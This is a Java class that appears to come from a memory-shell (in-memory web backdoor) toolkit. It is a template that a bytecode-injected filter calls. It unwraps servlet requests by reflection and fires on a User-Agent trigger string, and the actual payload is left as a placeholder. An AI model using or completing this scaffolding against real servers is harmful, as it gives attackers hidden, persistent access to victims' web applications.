package com.reajason.javaweb.memshell.shelltool.custom;

import java.lang.reflect.Field;

/**
 * 通用 Agent 内存马
 * <p>
 * Agent 字节码增强示例为如下：会调用当前类的 equals 方法
 * if(new Custom().equals(new Object[]{request, response, chain})){
 * return
 * }
 * 对于 request 和 response 的方法调用，请都使用反射
 *
 * @author ReaJason
 */
public class Custom {

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        Object request = unwrapRequest(args[0]);
        Object response = unwrapResponse(args[1]);
        try {
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, "User-Agent");
            if (value != null && value.contains("something")) {
                // do something
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    public Object unwrapRequest(Object request) {
        Object internalRequest = request;
        while (true) {
            try {
                Object r = getFieldValue(request, "request");
                if (r == internalRequest) {
                    return r;
                } else {
                    internalRequest = r;
                }
            } catch (Exception e) {
                return internalRequest;
            }
        }
    }

    public Object unwrapResponse(Object response) {
        Object internalResponse = response;
        while (true) {
            try {
                Object r = getFieldValue(response, "response");
                if (r == internalResponse) {
                    return r;
                } else {
                    internalResponse = r;
                }
            } catch (Exception e) {
                return internalResponse;
            }
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Field field = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(name);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field == null) {
            throw new NoSuchFieldException(name);
        } else {
            field.setAccessible(true);
            return field.get(obj);
        }
    }
}
